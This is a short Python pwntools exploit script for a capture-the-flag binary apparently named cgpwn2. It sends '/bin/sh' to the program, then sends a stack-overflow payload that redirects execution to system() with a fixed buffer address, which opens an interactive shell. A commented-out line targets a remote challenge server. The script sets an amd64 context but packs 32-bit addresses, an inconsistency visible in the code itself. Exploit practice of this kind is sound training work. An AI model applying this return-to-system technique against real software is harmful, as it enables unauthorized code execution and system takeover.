from pwn import *
from zzPwnlib import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',64223)
elf_path    = './xctf_pwn_008_cgpwn2'
io          = process(elf_path)
elf         = ELF(elf_path)

systm_addr  = elf.plt['system']
binsh_addr  = 0x0804A080

payload      = payloadBase(0x26, 32)
payload     += p32(systm_addr)
payload     += p32(0xdeadbeef)
payload     += p32(binsh_addr)

io.recv()
io.sendline(b"/bin/sh")
io.recv()
io.sendline(payload)
io.interactive()